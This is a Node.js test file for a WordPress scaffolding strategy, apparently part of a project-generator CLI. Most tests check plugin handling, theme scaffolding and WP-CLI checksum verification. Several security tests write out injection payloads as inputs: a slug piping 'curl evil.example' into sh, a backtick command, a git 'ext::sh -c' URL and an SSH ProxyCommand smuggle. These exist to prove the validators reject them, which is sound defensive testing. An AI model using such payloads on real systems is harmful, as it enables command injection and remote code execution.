import test from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import fs from "fs-extra";
import WordPressStrategy, { normalizePlugins } from "../src/projects/strategies/WordPressStrategy.ts";
import { askWordPressQuestions } from "../src/projects/prompts/wordpressPrompts.ts";

test("normalizePlugins accepts a comma-separated string or array of valid slugs", () => {
  assert.deepEqual(normalizePlugins("woocommerce, advanced-custom-fields"), ["woocommerce", "advanced-custom-fields"]);
  assert.deepEqual(normalizePlugins(["woocommerce", "wordpress-seo"]), ["woocommerce", "wordpress-seo"]);
  assert.deepEqual(normalizePlugins(undefined), []);
});

test("normalizePlugins rejects a slug containing shell metacharacters, preventing injection into the generated install script", () => {
  assert.throws(() => normalizePlugins(["woocommerce; curl evil.example|sh"]), /Invalid plugin slug/);
  assert.throws(() => normalizePlugins("woocommerce,x`id`"), /Invalid plugin slug/);
});

// These two assert the validation guard in scaffold() runs — and rejects —
// before `runCommand("git", ...)` is ever reached, so no real git process is
// spawned by this test even though WordPressStrategy has no injectable
// command runner. `skipEnvironment: true` avoids needing a real EnvironmentService.
test("scaffold rejects a git ext::/leading-dash themeRepo before ever invoking git", async () => {
  const strategy = new WordPressStrategy(null);
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-strategy-"));
  await assert.rejects(
    () => strategy.scaffold(targetDir, { skipEnvironment: true, projectName: "demo", themeRepo: 'ext::sh -c "id>/tmp/x"' }),
    /Unsafe theme repository URL/,
  );
  await fs.remove(targetDir);
});

test("scaffold rejects an sshKeyPath containing shell metacharacters before building GIT_SSH_COMMAND", async () => {
  const strategy = new WordPressStrategy(null);
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-strategy-"));
  await assert.rejects(
    () => strategy.scaffold(targetDir, { skipEnvironment: true, projectName: "demo", themeRepo: "git@github.com:example/starter-theme.git", sshKeyPath: "/tmp/k -o ProxyCommand=sh -c id" }),
    /Unsafe SSH key path/,
  );
  await fs.remove(targetDir);
});

test("wp-woo always includes and activates WooCommerce, including non-interactive defaults", async () => {
  const result = await askWordPressQuestions({ projectName: "shop", projectType: "wp-woo", plugins: [] }, { nonInteractive: true });
  assert.deepEqual(result.plugins, ["woocommerce"]);

  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-woo-"));
  await new WordPressStrategy(null).scaffold(targetDir, { ...result, skipEnvironment: true, environment: "docker" });
  const script = await fs.readFile(path.join(targetDir, "scripts", "install-wp-plugins.sh"), "utf8");
  assert.match(script, /plugin install woocommerce --activate/);
  await fs.remove(targetDir);
});

test("wp-react scaffolds a buildable React/Vite WordPress theme when no repository is configured", async () => {
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-react-"));
  await new WordPressStrategy(null).scaffold(targetDir, { skipEnvironment: true, projectName: "react-site", projectType: "wp-react", environment: "docker" });
  const themeDir = path.join(targetDir, "wp-content", "themes", "react-site");
  const packageJson = await fs.readJSON(path.join(themeDir, "package.json"));
  assert.equal(packageJson.scripts.build, "vite build");
  assert.equal(packageJson.dependencies.react.startsWith("^19"), true);
  assert.match(await fs.readFile(path.join(themeDir, "functions.php"), "utf8"), /manifest\.json/);
  assert.match(await fs.readFile(path.join(themeDir, "src", "main.jsx"), "utf8"), /createRoot/);
  await fs.remove(targetDir);
});

test("generated WP-CLI installer verifies the pinned PHAR checksum before installation", async () => {
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-cli-script-"));
  await new WordPressStrategy(null).scaffold(targetDir, { skipEnvironment: true, projectName: "demo", environment: "docker", installWpCli: true });
  const script = await fs.readFile(path.join(targetDir, "scripts", "install-wp-plugins.sh"), "utf8");
  assert.match(script, /v2\.12\.0\/wp-cli-2\.12\.0\.phar/);
  assert.match(script, /\.sha512/);
  assert.match(script, /sha512sum -c/);
  await fs.remove(targetDir);
});
